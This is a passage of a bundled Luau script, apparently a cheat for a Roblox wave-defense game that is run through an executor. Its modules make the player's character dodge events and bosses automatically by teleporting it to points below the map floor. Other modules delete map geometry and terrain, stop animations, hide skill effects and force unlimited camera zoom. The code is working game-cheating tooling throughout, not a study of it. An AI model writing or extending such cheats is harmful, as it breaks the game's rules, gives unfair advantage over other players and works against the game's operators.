            writefile(path,game:GetService("HttpService"):JSONEncode({Version=1,Seen=api.Seen}))
        end)
    end
    local function environment()return tostring(workspace:GetAttribute("WaveDefenseEnvironment")or "")end
    local function detect()
        local text=(tostring(workspace:GetAttribute("WaveDefenseArea")or "").." "..environment().." "..tostring(workspace:GetAttribute("SpecialWave")or "")):lower()
        if text:find("darkness",1,true)then return "Blackout"end
        for _,name in ipairs(eventNames)do if text:find(name:lower(),1,true)then return name end end
        local special=workspace:GetAttribute("SpecialWave");if type(special)=="string"and special~=""then return special end
    end
    local function bounds()
        local container=workspace:FindFirstChild("WaveDefenseStuff")
        return container and container:FindFirstChild("LavaHazardRegion"),container and container:FindFirstChild("WaveDefenseOrigin")
    end
    local function actors(part)
        if player.Character and part:IsDescendantOf(player.Character)then return true end
        for _,name in ipairs({"Mobs","Characters","CharacterItems","HitEffects"})do
            local folder=workspace:FindFirstChild(name)
            if folder and part:IsDescendantOf(folder)then return true end
        end
        return false
    end
    local function halfSize(part)
        local cf,size=part.CFrame,part.Size
        local x=math.abs(cf.RightVector.X)*size.X+math.abs(cf.UpVector.X)*size.Y+math.abs(cf.LookVector.X)*size.Z
        local y=math.abs(cf.RightVector.Y)*size.X+math.abs(cf.UpVector.Y)*size.Y+math.abs(cf.LookVector.Y)*size.Z
        local z=math.abs(cf.RightVector.Z)*size.X+math.abs(cf.UpVector.Z)*size.Y+math.abs(cf.LookVector.Z)*size.Z
        return Vector3.new(x,y,z)/2
    end
    local function exclusions(extra)
        local result={}
        for _,name in ipairs({"Mobs","Characters","CharacterItems","HitEffects","WaveDefenseStuff"})do
            local object=workspace:FindFirstChild(name)
            if object then result[#result+1]=object end
        end
        if player.Character then result[#result+1]=player.Character end
        for _,name in ipairs(extra or {})do local object=workspace:FindFirstChild(name);if object then result[#result+1]=object end end
        return result
    end
    function api.FloorY(point)
        local _,origin=bounds()
        local env=environment()
        if terrain.Environment~=env then terrain.Environment=env;terrain.Floor=nil;terrain.Refuge=nil end
        local offset=math.abs(state.TeleportOffset or 20)
        local reference=origin and origin.Position.Y or point.Y+(state.OffsetMode=="Above"and 32 or math.max(32,offset))
        local params=RaycastParams.new()
        params.FilterType=Enum.RaycastFilterType.Exclude;params.RespectCanCollide=true;params.FilterDescendantsInstances=exclusions()
        local hit=workspace:Raycast(Vector3.new(point.X,reference+8,point.Z),Vector3.new(0,-math.max(180,offset+160),0),params)
        if hit and hit.Normal.Y>.6 then terrain.Floor=hit.Position.Y end
        if not hit and state.PerformanceBoosters and (state.PerformanceBoosters["Delete map"]or state.PerformanceBoosters["Remove everything"])then return point.Y+20 end
        return terrain.Floor or reference
    end
    function api.BlackoutPoint(point)
        local env=environment();local now=os.clock()
        if terrain.Refuge and terrain.Environment==env and now<terrain.RefugeUntil then return terrain.Refuge end
        local _,origin=bounds()
        local center=origin and origin.Position or point
        local y=origin and origin.Position.Y or api.FloorY(point)
        local minimum=workspace.FallenPartsDestroyHeight+35
        local ignored=exclusions({"ActiveLavaHazard","PillarSpawns"})
        local params=RaycastParams.new();params.FilterType=Enum.RaycastFilterType.Exclude;params.RespectCanCollide=true
        local from=Vector3.new(center.X,y+64,center.Z)
        local bottom
        for _=1,12 do
            if from.Y<=minimum then break end
            params.FilterDescendantsInstances=ignored
            local hit=workspace:Raycast(from,Vector3.new(0,minimum-from.Y,0),params)
            if not hit then break end
            local part=hit.Instance
            if not part or not part:IsA("BasePart")then return nil end
            ignored[#ignored+1]=part
            local under=part.Position.Y-halfSize(part).Y
            if part.Anchored and part.CanCollide and not actors(part)then bottom=math.min(bottom or under,under)end
            from=Vector3.new(center.X,math.min(hit.Position.Y,under)-.5,center.Z)
        end
        if not bottom or bottom-20<=minimum then return nil end
        terrain.Environment=env;terrain.Refuge=Vector3.new(center.X,bottom-20,center.Z);terrain.RefugeUntil=now+1
        state.BlackoutMapBottom=bottom;state.BlackoutShelter=terrain.Refuge
        return terrain.Refuge
    end
    function api.IsHazardPart(part)return ctx.BossDodge and ctx.BossDodge.IsHazardPart(part)end
    local function release()
        if api.Active then ctx.Release()end
        api.Active=false;state.Dodging=false;state.BlackoutHolding=false
    end
    local function hold(point,kind,now,force)
        if point.Y<=workspace.FallenPartsDestroyHeight+30 then return false end
        api.Active=true;state.Dodging=true;ctx.Hold(point,nil,force)
        if now-timing.LastMove>.2 and (not api.LastPosition or (api.LastPosition-point).Magnitude>2)then
            timing.LastMove=now;api.Moves+=1
            if event then event.Moves=(event.Moves or 0)+1 end
            api.History[#api.History+1]={Kind=kind,Position=point,At=now,Wave=workspace:GetAttribute("Wave")}
            if #api.History>40 then table.remove(api.History,1)end
        end
        api.LastPosition=point;return true
    end
    local function observe(kind,health,now)
        if kind~=lastEvent then
            if event then event.EndHealth=health and health.Value;event.Completed=true;event.Ended=now;persist()end
            release();api.LastPosition=nil
            if kind then
                local previous=api.Seen[kind]
                if previous and previous.JobId==game.JobId and previous.Wave==workspace:GetAttribute("Wave")and not previous.Completed then event=previous
                else event={Name=kind,Wave=workspace:GetAttribute("Wave"),JobId=game.JobId,Count=(previous and previous.Count or 0)+1,Started=now,
                    StartHealth=health and health.Value,Damage=0,Moves=0,Rocks=0,Warnings=0,Enabled=state.AutoDodge}end
                api.Seen[kind]=event;event.DodgeVersion=state.Version;persist()
            else event=nil end
            lastEvent=kind
        end
        if health then
            if lastHealth and health.Value<lastHealth and event then event.Damage+=lastHealth-health.Value end
            lastHealth=health.Value
        end
        state.WaveEventsSeen=api.Seen
    end
    local function needsKills(kind)
        local note=tostring(workspace:GetAttribute("CountdownNote")or ""):lower()
        if note:find("survive",1,true)then return false end
        if (tonumber(workspace:GetAttribute("WaveProgressLeft"))or 0)>0 then return true end
        if kind=="Horde"or kind=="Rift"or kind=="Wisp"or kind=="Meme"or kind=="Bob"then return true end
        return kind~="Lava"and kind~="Tempest"and kind~="Blackout"and (tonumber(workspace:GetAttribute("MobsLeft"))or 0)>0
    end
    function api.Update()
        if closed or state.StopEverything then return false end
        local now=os.clock();if now<timing.UpdateAt then return api.Active end
        local fast=state.AtheonDodge and ctx.AtheonDodge and ctx.AtheonDodge.Active and not state.NetworkPressureLimited
        timing.UpdateAt=now+(fast and 1/60 or .04)
        local kind=detect();api.Event=kind;state.OffsetMode="Below";state.FarmAbove=false
        local character=player.Character;local root=character and character:FindFirstChild("HumanoidRootPart")
        local humanoid=character and character:FindFirstChildOfClass("Humanoid")
        local entity=character and character:FindFirstChild("Entity");local health=entity and entity:FindFirstChild("Health")
        observe(kind,health,now)
        local seen=0;for _ in pairs(api.Seen)do seen+=1 end
        local usable=root and humanoid and health and health.Value>0 and not state.TravelBusy
        local blackout=kind=="Blackout" and state.AutoDodge
        if usable and not blackout and ctx.AeganatosDodge then
            local point,reason=ctx.AeganatosDodge.Plan(root.Position,state.AutoOffsetDestination or root.Position)
            if point then
                if state.SkillCastRunning and state.CancelSkillAura then state.CancelSkillAura("Aeganatos dodge")end
                hold(point,"Aeganatos evade: "..tostring(reason),now);ctx.Status("Aeganatos Dodge · "..tostring(reason));return true
            end
        end
        local target=state.FollowTarget;local targetRoot=target and target:FindFirstChild("HumanoidRootPart")
        local desired=root and targetRoot and Vector3.new(targetRoot.Position.X,root.Position.Y,targetRoot.Position.Z)or root and root.Position
        if usable and not blackout and ctx.AtheonDodge then
            local point,reason=ctx.AtheonDodge.Plan(root.Position,desired,api.FloorY)
            if point then hold(point,"Atheon evade: "..tostring(reason),now);ctx.Status("Atheon Dodge · "..tostring(reason));return true end
        end
        if not state.AutoDodge or not usable then release();ctx.Status((state.AutoDodge and "Ready"or "Off").." · events "..seen.."/8");return false end
        if blackout then
            local entering=not state.BlackoutHolding
            if entering then state.FollowTarget=nil end
            state.BlackoutHolding=true
            local held=hold(darknessShelter,"Blackout shelter",now,entering)
            state.Dodging=not held or (root.Position-darknessShelter).Magnitude>1.25
            ctx.Status("Blackout · holding fixed position")
            return true
        end
        if kind and not needsKills(kind)and hold(Vector3.new(10,-19,-5),kind.." shelter",now)then
            ctx.Status(kind.." · sheltering");return true
        end
        if ctx.BossDodge and not(state.AtheonDodge and ctx.AtheonDodge and ctx.AtheonDodge.NearBoss)then
            local region=bounds();local point,reason=ctx.BossDodge.Plan(root.Position,desired,region)
            if point then hold(point,"Boss evade: "..tostring(reason),now);ctx.Status("Boss attack · outside danger zone");return true end
            if ctx.BossDodge.Blocked then local refuge=api.BlackoutPoint(root.Position);if refuge then hold(refuge,"Boss evade below map bottom",now);return true end end
        end
        release();ctx.Status((kind and kind.." · watching"or "Ready").." · events "..seen.."/8");return false
    end
    function api.Idle(anchor)
        if closed or state.StopEverything then return end
        local root=player.Character and player.Character:FindFirstChild("HumanoidRootPart");if not root then return end
        local point=anchor or root.Position;local floor=anchor and anchor.Y or api.FloorY(point)
        ctx.Hold(Vector3.new(point.X,floor-20,point.Z),true)
        state.IdleFloorY=floor;state.IdleBelowMap=true;state.IdleAboveMap=false
    end
    function api.Destroy()
        if closed then return end
        closed=true;persist()
        for _,controller in pairs({ctx.BossDodge,ctx.AtheonDodge,ctx.AeganatosDodge})do if controller then controller.Destroy()end end
        release()
    end
    return api
end

-- END BUNDLED WAVE DODGE
end)()({State=state,BossDodge=state.BossDodge,AtheonDodge=state.AtheonDodgeController,AeganatosDodge=state.AeganatosDodgeController,
    Hold=function(point,farmIdle,force)
        local character=player.Character
        local root=character and character:FindFirstChild("HumanoidRootPart")
        local human=character and character:FindFirstChildOfClass("Humanoid")
        if not root or not human then return end
        if movementRoot and movementRoot~=root then stopMovement(nil,true)end
        ensureMovementController(character,root,human,point)
        positionAlign.Enabled=true;orientationAlign.Enabled=true;positionAlign.Position=point
        if force or (root.Position-point).Magnitude>1.25 then
            if farmIdle and state.AutoFarm then tweenFarmRoot(root,point)else pivotRoot(root,point)end
            state.TeleportsSent+=1
        end
    end,
    Release=function()
        teleportTarget=nil;correctionTarget=nil;correctionStrikes=0;nextMovementUpdate=0;nextAcquisition=0
        state.LastDodgeFinishedAt=os.clock();state.DodgeReturnPending=state.AutoFarm;state.OffsetGraceUntil=os.clock()+.6
        if state.WakeSkillAura then state.WakeSkillAura()end
        if state.AutoFarm then return end
        if state.MultiSpot and state.MultiSpotAnchor and state.FinishMultiSpotArrival then state.FinishMultiSpotArrival();return end
        if not state.TravelHold or not state.TravelHoldPosition then stopMovement("Dodge complete",true);return end
        local character=player.Character
        local root=character and character:FindFirstChild("HumanoidRootPart")
        local human=character and character:FindFirstChildOfClass("Humanoid")
        if root and human then ensureMovementController(character,root,human,state.TravelHoldPosition);positionAlign.Position=state.TravelHoldPosition;pivotRoot(root,state.TravelHoldPosition)end
    end,
    Status=function(text)state.DodgeStatus=text end})
state.WaveDodge=waveDodge
function state.SetAutoDodge(enabled)
    if state.StopEverything and enabled==true then return false end
    state.AutoDodge=enabled==true
    dodgeToggle.Text=state.AutoDodge and "Auto dodge · ON"or "Auto dodge · OFF"
    dodgeToggle.BackgroundColor3=state.AutoDodge and Color3.fromRGB(91,72,164)or Color3.fromRGB(45,48,63)
    requestSave()
end
bind(dodgeToggle.Activated,function()state.SetAutoDodge(not state.AutoDodge)end)
state.SetAutoDodge(restore.AutoDodge)

do
    local savedZoom=player.CameraMaxZoomDistance
    local restoringZoom=false
    local roots={}
    local excluded={Mobs=true,Characters=true,CharacterItems=true,HitEffects=true,WaveDefenseStuff=true,MobSpawnEffects=true}
    local function zoom()
        if not restoringZoom and state.Running and not state.StopEverything and player.CameraMaxZoomDistance<1000000 then player.CameraMaxZoomDistance=1000000 end
    end
    for name in pairs(excluded)do roots[name]=workspace:FindFirstChild(name)end
    bind(workspace.ChildAdded,function(object)if excluded[object.Name]then roots[object.Name]=object end end)
    bind(workspace.ChildRemoved,function(object)if roots[object.Name]==object then roots[object.Name]=nil end end)
    bind(player:GetPropertyChangedSignal("CameraMaxZoomDistance"),zoom);zoom()
    local function mapPart(part)
        if state.StopEverything or not part:IsA("BasePart")then return false end
        if state.SkillVisuals and state.SkillVisuals.IsEffect(part)then return false end
        if player.Character and part:IsDescendantOf(player.Character)then return false end
        for _,root in pairs(roots)do if part:IsDescendantOf(root)then return false end end
        return not waveDodge.IsHazardPart(part)
    end
    function state.RestoreWorldVisuals()restoringZoom=true;player.CameraMaxZoomDistance=savedZoom end
    local makeDeletion=(function()
-- BEGIN BUNDLED MAP DELETION
-- Explicit static-world cleanup owns one cancellable streamed-work session.
return function(ctx)
    local api={Removed=0,Pending=0,MaxQueued=0}
    local session,closed=nil,false
    local excluded={Mobs=true,Characters=true,CharacterItems=true,HitEffects=true,WaveDefenseStuff=true,MobSpawnEffects=true,CurrentCamera=true}
    local names={"teleport","portal","spawn","checkpoint","trigger","hazard","npc","shop","quest","pad","door"}
    local function protected(node)
        if excluded[node.Name]or node:IsA("Camera")or node:IsA("Tool")then return true end
        local normalized=node.Name:lower()
        for _,word in ipairs(names)do if normalized:find(word,1,true)then return true end end
        if node:IsA("Model")and (ctx.Players:GetPlayerFromCharacter(node)or node:FindFirstChildOfClass("Humanoid")or node:FindFirstChild("Entity"))then return true end
        for _,kind in ipairs({"ProximityPrompt","ClickDetector","TouchTransmitter"})do if node:FindFirstChildOfClass(kind)then return true end end
        return false
    end
    function api.Removable(part)
        if not part.Parent or not part:IsA("BasePart")or part:IsA("Terrain")or ctx.Protected(part)then return false end
        local node=part
        repeat
            if node==ctx.Root then return true end
            if protected(node)then return false end
            node=node.Parent
        until not node
        return false
    end
    local function active(owner)return not closed and session==owner and ctx.State.Running end
    local function census(owner)
        owner.Scan=ctx.Root:QueryDescendants("BasePart");owner.Cursor=1;owner.Length=#owner.Scan;owner.Rescan=false
    end
    local function pending(owner)return math.max(0,owner.Length-owner.Cursor+1)+math.max(0,owner.Tail-owner.Head+1)end
    local function start(owner)
        if owner.Worker then return end
        owner.Worker=true
        ctx.Defer(function()
            if not active(owner)then return end
            if owner.Rescan then census(owner)end
            if ctx.ClearTerrain then
                local ok,reason=pcall(ctx.ClearTerrain);api.TerrainCleared=ok
                if not ok then api.LastError=tostring(reason)end
            end
            while active(owner)do
                if ctx.State.StopEverything then ctx.Wait(.25)
                else
                    local due=ctx.Now()+.0015
                    local processed=0
                    while processed<128 and ctx.Now()<due and active(owner)do
                        local part
                        if owner.Cursor<=owner.Length then
                            part=owner.Scan[owner.Cursor];owner.Scan[owner.Cursor]=nil;owner.Cursor+=1
                        elseif owner.Head<=owner.Tail then
                            part=owner.Queue[owner.Head];owner.Queue[owner.Head]=nil;owner.Head+=1;owner.Seen[part]=nil
                        else break end
                        local checked,allowed=pcall(api.Removable,part)
                        if checked and allowed and pcall(function()part:Destroy()end)then api.Removed+=1 end
                        processed+=1
                    end
                    api.Pending=pending(owner)
                    if api.Pending==0 then
                        if owner.Rescan then census(owner)else break end
                    end
                    ctx.Wait()
                end
            end
            if active(owner)then
                owner.Worker=false;owner.Queue={};owner.Seen={};owner.Head=1;owner.Tail=0;owner.Scan={};owner.Cursor=1;owner.Length=0;api.Pending=0
            end
        end)
    end
    function api.Set(enabled)
        if closed then return false end
        enabled=enabled==true
        if enabled==(session~=nil)then return true end
        local previous=session;session=nil
        if previous then
            previous.Added:Disconnect();table.clear(previous.Queue);table.clear(previous.Scan);table.clear(previous.Seen)
        end
        api.Pending=0
        if enabled then
            local owner={Queue={},Seen=setmetatable({}, {__mode="k"}),Head=1,Tail=0,Scan={},Cursor=1,Length=0,Rescan=true,Worker=false}
            session=owner
            owner.Added=ctx.Root.DescendantAdded:Connect(function(part)
                if not active(owner)or not part:IsA("BasePart")or owner.Seen[part]then return end
                if owner.Tail-owner.Head+1>=8192 then owner.Rescan=true;return end
                owner.Tail+=1;owner.Queue[owner.Tail]=part;owner.Seen[part]=true
                api.MaxQueued=math.max(api.MaxQueued,owner.Tail-owner.Head+1)
                start(owner)
            end)
            start(owner)
        end
        return true
    end
    function api.Destroy()if closed then return end;api.Set(false);closed=true end
    return api
end

-- END BUNDLED MAP DELETION
    end)()
    state.MapDeletion=makeDeletion({State=state,Root=workspace,Players=Players,Now=os.clock,Defer=task.defer,Wait=task.wait,
        ClearTerrain=function()workspace.Terrain:Clear()end,Protected=function(part)return not mapPart(part)end})
    local makeAnimations=(function()
-- BEGIN BUNDLED ANIMATION REMOVAL
-- Animator subscriptions are scoped to one enabled session and never retain tracks.
return function(ctx)
    local api={Stopped=0}
    local session=nil
    local closed=false
    local function stop(track)
        if closed or not session or ctx.State.StopEverything then return end
        if pcall(function()track:Stop(0)end)then api.Stopped+=1 end
    end
    local function forget(animator)
        if not session then return end
        local connection=session.Animators[animator]
        if connection then connection:Disconnect();session.Animators[animator]=nil end
    end
    local function watch(animator)
        if not session or not animator:IsA("Animator")or session.Animators[animator]then return end
        session.Animators[animator]=animator.AnimationPlayed:Connect(stop)
        for _,track in ipairs(animator:GetPlayingAnimationTracks())do stop(track)end
    end
    local function release()
        if not session then return end
        for _,connection in ipairs(session.Roots)do connection:Disconnect()end
        for animator in pairs(session.Animators)do forget(animator)end
        session=nil
    end
    function api.Set(enabled)
        if closed then return false end
        enabled=enabled==true
        if enabled==(session~=nil)then return true end
        release();ctx.State.RemovingAnimations=enabled
        if enabled then
            session={Animators={},Roots={}}
            session.Roots[1]=ctx.Root.DescendantAdded:Connect(watch)
            session.Roots[2]=ctx.Root.DescendantRemoving:Connect(forget)
            for _,animator in ipairs(ctx.Root:QueryDescendants("Animator"))do watch(animator)end
        end
        return true
    end
    function api.Destroy()
        if closed then return end
        api.Set(false);closed=true
    end
    return api
end

-- END BUNDLED ANIMATION REMOVAL
    end)()
    state.AnimationRemoval=makeAnimations({State=state,Root=workspace})
    local all=state.PerformanceBoosters["Remove everything"]==true
    state.MapDeletion.Set(all or state.PerformanceBoosters["Delete map"]==true)
    state.AnimationRemoval.Set(all or state.PerformanceBoosters["Remove animations"]==true)
end

do
    local makeQueue=(function()
-- BEGIN BUNDLED INSTANCE QUEUE
-- Fixed-capacity pooled FIFO lanes release instance references on unlink.
return function(limit)
    assert(type(limit)=="number"and limit>=1,"A positive capacity is required")
    local api={Count=0,Dropped=0,Peak=0}
    local first,last={0,0},{0,0}
    local slots,locations,reusable={},{},{}
    local allocated,closed=0,false
    local function erase(value)
        local slot=locations[value]
        if not slot then return false end
        local node=slots[slot];local lane=node.Lane
        if node.Before==0 then first[lane]=node.After else slots[node.Before].After=node.After end
        if node.After==0 then last[lane]=node.Before else slots[node.After].Before=node.Before end
        locations[value]=nil;node.Value=nil;node.Before=0;node.After=0
        reusable[#reusable+1]=slot;api.Count-=1
        return true
    end
    function api.Contains(value)return locations[value]~=nil end
    function api.Push(value,urgent)
        if closed or value==nil or locations[value]then return false end
        if api.Count>=limit then api.Dropped+=1;return false end
        local slot=table.remove(reusable)
        if not slot then allocated+=1;slot=allocated;slots[slot]={}end
        local lane=urgent and 1 or 2;local node=slots[slot]
        node.Value=value;node.Lane=lane;node.Before=last[lane];node.After=0
        if last[lane]==0 then first[lane]=slot else slots[last[lane]].After=slot end
        last[lane]=slot;locations[value]=slot
        api.Count+=1;api.Peak=math.max(api.Peak,api.Count)
        return true
    end
    api.Remove=erase
    function api.Pop()
        local slot=first[1]~=0 and first[1]or first[2]
        if slot==0 then return nil end
        local result=slots[slot].Value;erase(result);return result
    end
    function api.Clear()
        table.clear(locations);table.clear(reusable)
        for slot=1,allocated do
            local node=slots[slot];node.Value=nil;node.Before=0;node.After=0
            reusable[slot]=slot
        end
        first[1],first[2],last[1],last[2]=0,0,0,0;api.Count=0
    end
    function api.Destroy()
        closed=true;api.Clear();table.clear(slots);table.clear(reusable);allocated=0
    end
    return api
end

-- END BUNDLED INSTANCE QUEUE
    end)()
    local create=(function()
-- BEGIN BUNDLED SKILL VISUALS
-- Local visual overlays preserve native hitbox geometry, timers and animation markers.
return function(ctx)
    local state=ctx.State
    local player=game.Players.LocalPlayer
    local api={AnimationsHidden=0,EffectsHidden=0,Pending=0}
    local disposed=false
    local pending=assert(ctx.Queue,"Bounded visual queue is required")
    local managed,tracks={},{}
    local maintenance=setmetatable({}, {__mode="v"})
    local maintenanceNext=setmetatable({}, {__mode="v"})
    local maintenanceQueued=setmetatable({}, {__mode="k"})
    local maintenanceHead,maintenanceTail,maintenanceNextTail=1,0,0
    local ordinaryTracks=setmetatable({}, {__mode="k"})
    local invisible=NumberSequence.new(1)
    local catalogs={Animation={},Sound={},Name={},Skill={},Ordinary={}}
    local gunModels=setmetatable({}, {__mode="k"})
    local gunOrigin,gunUntil=nil,0
    local connections={}
    local animator,animationConnection
    local nextAnimation=0
    local hiddenWeight=.0001
    local function normalize(value)return tostring(value or ""):lower():gsub("[^%w]","")end
    local function id(value)return tostring(value or ""):match("%d+")end
    local generic={part=true,meshpart=true,model=true,folder=true,attachment=true,rock=true,rocks=true,groundrocks=true,floor=true,terrain=true,baseplate=true,spawnlocation=true,humanoidrootpart=true,uppertorso=true,lowertorso=true,vfx=true,handle=true,trail=true,beam=true,light=true,animation=true,particleemitter=true,pointlight=true,spotlight=true,surfacelight=true,sound=true,smoke=true,texture=true,decal=true}
    local locomotion={idle=true,walk=true,run=true,jump=true,fall=true,climb=true,swim=true,swimidle=true,sit=true,toolnone=true}
    for _,definition in ipairs(game.ReplicatedStorage.Database.Skills:GetChildren())do catalogs.Skill[normalize(definition.Name)]=true end
    for _,service in ipairs({ctx.Services.Skills,ctx.Services.SkillEffects})do
        for _,object in ipairs(service:QueryDescendants("Animation,BasePart,ParticleEmitter,Beam,Trail,Model,Sound"))do
            if object:IsA("Animation")then local key=id(object.AnimationId);if key then catalogs.Animation[key]=true end
            else
                if object:IsA("Sound")then local key=id(object.SoundId);if key then catalogs.Sound[key]=true end end
                local key=normalize(object.Name);if #key>=5 and not generic[key]then catalogs.Name[key]=true end
            end
            if state.YieldStartup then state.YieldStartup()end
        end
    end
    for _,pack in pairs(ctx.Actions.animations)do if type(pack)=="table"then
        for name,track in pairs(pack)do
            if type(name)=="string"and typeof(track)=="Instance"and track:IsA("AnimationTrack")and track.Animation then
                local key=id(track.Animation.AnimationId)
                if key then local collection=catalogs.Skill[normalize(name)]and catalogs.Animation or catalogs.Ordinary;collection[key]=true end
            end
        end
    end end
    local function keep(object)
        if (object:IsA("BillboardGui")or object:IsA("SurfaceGui"))and #object:QueryDescendants("TextLabel,TextButton")>0 then return true end
        if ctx.Preserve and ctx.Preserve(object)then return true end
        local mobs=workspace:FindFirstChild("Mobs")
        if mobs and object:IsDescendantOf(mobs)then return true end
        local characters=workspace:FindFirstChild("Characters")
        if characters and object:IsDescendantOf(characters)and not(player.Character and object:IsDescendantOf(player.Character))then return true end
        local items=workspace:FindFirstChild("CharacterItems")
        local own=items and items:FindFirstChild(tostring(player.UserId))
        return items and object:IsDescendantOf(items)and not(own and object:IsDescendantOf(own))or false
    end
    local function gunEffect(object)
        local part=object:IsA("BasePart")and object or object:FindFirstAncestorWhichIsA("BasePart")
        if not part then return false end
        local near=false
        for model,expires in pairs(gunModels)do
            if not model.Parent or os.clock()>expires then gunModels[model]=nil
            else local gun=model:FindFirstChild("Gun");if gun and gun:IsA("BasePart")and (part.Position-gun.Position).Magnitude<160 then near=true;break end end
        end
        if not near and gunOrigin and os.clock()<gunUntil then
            local root=player.Character and player.Character:FindFirstChild("HumanoidRootPart")
            near=(part.Position-gunOrigin).Magnitude<160 or root and (part.Position-root.Position).Magnitude<160
        end
        if not near then return false end
        if object:IsA("Trail")or object:IsA("Beam")or object:IsA("ParticleEmitter")then return true end
        local sphere=part:IsA("Part")and part.Name=="Part"and not part.CanCollide and part.Shape==Enum.PartType.Ball and part.Transparency>=.95 and part.Size.X>=8 and part.Size.X<=16
        if object:IsA("Decal")then return sphere or object.Texture:find("3170098415",1,true)~=nil or object.Texture:find("3170224154",1,true)~=nil end
        if sphere and (object:IsA("Light")or object:IsA("Sound"))then return true end
        if object:IsA("BasePart")and not object.CanCollide and object.Material==Enum.Material.Neon then
            if object.BrickColor==BrickColor.new("Bright yellow")then return true end
            if object:IsA("Part")and object.Name=="Part"and object.BrickColor==BrickColor.new("Bright blue")then
                return object.Shape==Enum.PartType.Ball or object.Size.Z>object.Size.X*3 and object.Size.Z>object.Size.Y*3
            end
        end
        return false
    end
    local function effect(object)
        if managed[object]then return true end
        if keep(object)then return false end
        if gunEffect(object)then return true end
        if object:IsA("Sound")and catalogs.Sound[id(object.SoundId)]then return true end
        local own=player.Character and object:IsDescendantOf(player.Character)
        if own and object:IsA("BasePart")and (object.Parent==player.Character or object.Parent:IsA("Accessory")or object.Parent:IsA("Tool"))then return false end
        if own and (object:IsA("ParticleEmitter")or object:IsA("Beam")or object:IsA("Trail")or object:IsA("Light")or object:IsA("Smoke")or object:IsA("Fire")or object:IsA("Sparkles"))then return true end
        local node=object
        while node and node~=workspace do
            local key=normalize(node.Name)
            if node.Name=="HitEffects"or catalogs.Skill[key]or catalogs.Name[key]or key=="pistol"or key=="rifle"or key=="summonrifle"then return true end
            if key=="ar"and node:IsA("Model")and node:FindFirstChild("Gun")and (node:FindFirstChild("Portal1")or node:FindFirstChild("Portal2"))then return true end
            node=node.Parent
        end
        return false
    end
    -- Isolated property access handles mobile executors that reject optional members.
    local function write(object,property,value)
        return pcall(function()object[property]=value end)
    end
    local function restore(object,record)
        for property,value in pairs(record.Before)do write(object,property,value)end
    end
    local function suppress(object)
        if disposed or state.StopEverything or managed[object]or not effect(object)then return end
        if maintenanceTail-maintenanceHead+1+maintenanceNextTail>=8192 then return end
        local hidden
        if object:IsA("BasePart")then
            if ctx.ExcludeMapPart then ctx.ExcludeMapPart(object)end
            hidden={Transparency=1,LocalTransparencyModifier=1}
        elseif object:IsA("ParticleEmitter")or object:IsA("Beam")or object:IsA("Trail")then hidden={Enabled=false,Transparency=invisible,LocalTransparencyModifier=1}
        elseif object:IsA("Light")then hidden={Brightness=0,Enabled=false}
        elseif object:IsA("Sound")then hidden={Volume=0}
        elseif object:IsA("Decal")or object:IsA("Texture")then hidden={Transparency=1}
        elseif object:IsA("Highlight")then hidden={Enabled=false,FillTransparency=1,OutlineTransparency=1}
        elseif object:IsA("Smoke")or object:IsA("Fire")or object:IsA("Sparkles")or object:IsA("BillboardGui")or object:IsA("SurfaceGui")then hidden={Enabled=false}end
        if not hidden then return end
        local before={}
        for property,value in pairs(hidden)do
            local readable,original=pcall(function()return object[property]end)
            if readable and write(object,property,value)then before[property]=original else hidden[property]=nil end
        end
        if not next(hidden)then return end
        managed[object]={Before=before,Hidden=hidden,Parent=object.Parent}
        if not maintenanceQueued[object]then maintenanceTail+=1;maintenance[maintenanceTail]=object;maintenanceQueued[object]=true end
        if object:IsA("ParticleEmitter")or object:IsA("Trail")then pcall(function()object:Clear()end)end
        api.EffectsHidden+=1
    end
    local function isSkill(track)
        if ordinaryTracks[track]then return false end
        local name=normalize(track.Name)
        if locomotion[name]or name:sub(1,5)=="swing"then return false end
        local asset=track.Animation and id(track.Animation.AnimationId)
        if asset and catalogs.Animation[asset]then return true end
        if asset and catalogs.Ordinary[asset]then return false end
        if catalogs.Skill[name]or track.Priority.Value>=Enum.AnimationPriority.Action.Value then return true end
        return (state.SkillCastRunning or ctx.SkillState and ctx.SkillState.usingSkill~="none")and not locomotion[name]
    end
    api.IsSkillAnimation=isSkill
    function api.MarkGunCast(name,origin)
        if name=="Summon Pistol"or name=="Summon Rifle"then gunOrigin=origin;gunUntil=os.clock()+5 end
    end
    function api.AllowSwingTrack(track)
        ordinaryTracks[track]=true
        local weight=tracks[track];tracks[track]=nil
        if weight and track.IsPlaying then track:AdjustWeight(weight.Weight,0)end
    end
    local function hideTrack(track)
        if disposed or state.StopEverything or not isSkill(track)then return end
        if not tracks[track]then tracks[track]={Weight=track.WeightTarget};api.AnimationsHidden+=1 end
        if math.abs(track.WeightTarget-hiddenWeight)>.00001 or track.WeightCurrent>.001 then track:AdjustWeight(hiddenWeight,0)end
    end
    local eligible={ParticleEmitter=true,Beam=true,Trail=true,Smoke=true,Fire=true,Sparkles=true,Texture=true,Sound=true,Decal=true,BillboardGui=true,SurfaceGui=true,Highlight=true}
    local function candidate(object)return object:IsA("BasePart")or object:IsA("Light")or eligible[object.ClassName]end
    local function queue(object,priority)
        if not disposed and not state.StopEverything and not managed[object]and candidate(object)then pending.Push(object,priority)end
    end
    function api.ProcessPending()
        local deadline=os.clock()+.0006
        local processed=0
        while processed<64 and (processed==0 or os.clock()<deadline)do
            local object=pending.Pop();if not object then break end
            if object.Parent then pcall(suppress,object)end
            processed+=1
        end
        api.Pending=pending.Count;state.VisualQueueSize=api.Pending
    end
    local burst={At=0,Count=0}
    local function added(object)
        if disposed or state.StopEverything or not state.Running then return end
        if object:IsA("Model")and (object.Name=="AR"or object.Name=="Pistol")then
            gunModels[object]=os.clock()+5
            for _,child in ipairs(object:QueryDescendants("BasePart,ParticleEmitter,Beam,Trail,Smoke,Fire,Sparkles,Sound,Decal,Texture"))do queue(child,true)end
        end
        if object:IsA("TextLabel")or object:IsA("TextButton")then
            local gui=object:FindFirstAncestorWhichIsA("BillboardGui")or object:FindFirstAncestorWhichIsA("SurfaceGui")
            if gui and managed[gui]then restore(gui,managed[gui]);managed[gui]=nil end
            return
        end
        if not candidate(object)then return end
        local stamp=os.clock();if stamp-burst.At>=.05 then burst.At=stamp;burst.Count=0 end
        if burst.Count<24 then burst.Count+=1;pcall(suppress,object)end
        queue(object,state.SkillCastRunning or state.MiscCastRunning or object:IsA("ParticleEmitter")or object:IsA("Beam")or object:IsA("Trail")or object:IsA("Sound")or catalogs.Name[normalize(object.Name)])
    end
    connections[1]=workspace.DescendantAdded:Connect(added)
    connections[2]=workspace.DescendantRemoving:Connect(function(object)
        pending.Remove(object)
        local record=managed[object];managed[object]=nil
        if record then restore(object,record)end
    end)
